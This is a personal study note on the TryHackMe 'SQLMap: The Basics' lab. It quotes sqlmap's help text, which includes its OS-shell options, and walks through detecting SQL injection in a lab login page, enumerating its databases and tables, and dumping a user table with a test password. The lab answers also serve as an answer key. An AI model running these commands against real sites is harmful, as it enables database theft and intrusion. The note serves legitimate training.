---
Main Topic: Tools
Sub Topic: SQLMap___The Basics
Links:
  - https://tryhackme.com/room/sqlmapthebasics
Date: 13-01-2026
Related Notes: 
tags:
  - Cyber_Security
  - Basics
  - Tools
  - THM
---

# SQLMap___The Basics

> [!INFO] SQLMap
> SQLMap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.

```
sqlmap -h    
       ___  
      __H__  
___ ___["]_____ ___ ___  {1.9.12#stable}  
|_ -| . [(]     | .'| . |  
|___|_  [']_|_|_|__,|  _|  
     |_|V...       |_|   https://sqlmap.org  
  
Usage: python3 sqlmap [options]  
  
Options:  
 -h, --help            Show basic help message and exit  
 -hh                   Show advanced help message and exit  
 --version             Show program's version number and exit  
 -v VERBOSE            Verbosity level: 0-6 (default 1)  
  
 Target:  
   At least one of these options has to be provided to define the  
   target(s)  
  
   -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")  
   -g GOOGLEDORK       Process Google dork results as target URLs  
  
 Request:  
   These options can be used to specify how to connect to the target URL  
  
   --data=DATA         Data string to be sent through POST (e.g. "id=1")  
   --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")  
   --random-agent      Use randomly selected HTTP User-Agent header value  
   --proxy=PROXY       Use a proxy to connect to the target URL  
   --tor               Use Tor anonymity network  
   --check-tor         Check to see if Tor is used properly  
  
 Injection:  
   These options can be used to specify which parameters to test for,  
   provide custom injection payloads and optional tampering scripts  
  
   -p TESTPARAMETER    Testable parameter(s)  
   --dbms=DBMS         Force back-end DBMS to provided value  
  
 Detection:  
   These options can be used to customize the detection phase  
  
   --level=LEVEL       Level of tests to perform (1-5, default 1)  
   --risk=RISK         Risk of tests to perform (1-3, default 1)  
  
 Techniques:  
   These options can be used to tweak testing of specific SQL injection  
   techniques  
  
   --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")  
  
 Enumeration:  
   These options can be used to enumerate the back-end database  
   management system information, structure and data contained in the  
   tables  
  
   -a, --all           Retrieve everything  
   -b, --banner        Retrieve DBMS banner  
   --current-user      Retrieve DBMS current user  
   --current-db        Retrieve DBMS current database  
   --passwords         Enumerate DBMS users password hashes  
   --dbs               Enumerate DBMS databases  
   --tables            Enumerate DBMS database tables  
   --columns           Enumerate DBMS database table columns  
   --schema            Enumerate DBMS schema  
   --dump              Dump DBMS database table entries  
   --dump-all          Dump all DBMS databases tables entries  
   -D DB               DBMS database to enumerate  
   -T TBL              DBMS database table(s) to enumerate  
   -C COL              DBMS database table column(s) to enumerate  
  
 Operating system access:  
   These options can be used to access the back-end database management  
   system underlying operating system  
  
   --os-shell          Prompt for an interactive operating system shell  
   --os-pwn            Prompt for an OOB shell, Meterpreter or VNC  
  
 General:  
   These options can be used to set some general working parameters  
  
   --batch             Never ask for user input, use the default behavior  
   --flush-session     Flush session files for current target  
  
 Miscellaneous:  
   These options do not fit into any other category  
  
   --wizard            Simple wizard interface for beginner users  
  
[!] to see full list of options run with '-hh'
```


> [!NOTE] http-post
> We can also use POST-based testing, where the application sends data in the request's body instead of the URL. Examples of this could be login forms, registration forms, etc. To follow this approach, you must intercept a POST request on the login or registration page and save it as a text file. We can use the following command to input that request saved in the text file to the SQLMap tool: 
```
user@ubuntu:~$ sqlmap -r intercepted_request.txt
```

```
sqlmap -hh | grep -e "-r"  
-r REQUESTFILE      Load HTTP request from a file
```

---
## Practical Exercise

>In this task, we've attached a vulnerable web application for you to test SQL injection vulnerabilities. You will use this machine to carry out SQL injection through the SQLMap tool.

```bash
sqlmap -u 'http://10.82.151.106/ai/includes/user_login?email=test&password=test' --level=5
```
Output
```
GET parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n  
sqlmap identified the following injection point(s) with a total of 938 HTTP(s) requests:  
---  
Parameter: email (GET)
...
```

Now we know website is vulnerable. So, To fetch the databases, we use the flag `--dbs`.

```bash
sqlmap -u 'http://10.82.151.106/ai/includes/user_login?email=test&password=test' --dbs
```
Output
```
available databases [6]:  
[*] ai  
[*] information_schema  
[*] mysql  
[*] performance_schema  
[*] phpmyadmin  
[*] test
```

> What is the name of the table available in the "ai" database?

```bash
sqlmap -u 'http://10.82.151.106/ai/includes/user_login?email=test&password=test' -D ai --tables
```
Output
```
Database: ai  
[1 table]  
+------+  
| user |  
+------+
```

> What is the password of the email `test@chatai.com`?

```bash
sqlmap -u 'http://10.82.151.106/ai/includes/user_login?email=test&password=test' -D ai -T user --dump
```
Output
```
Database: ai  
Table: user  
[1 entry]  
+----+-----------------+---------------------+----------+  
| id | email           | created             | password |  
+----+-----------------+---------------------+----------+  
| 1  | test@chatai.com | 2023-02-21 09:05:46 | 12345678 |  
+----+-----------------+---------------------+----------+
```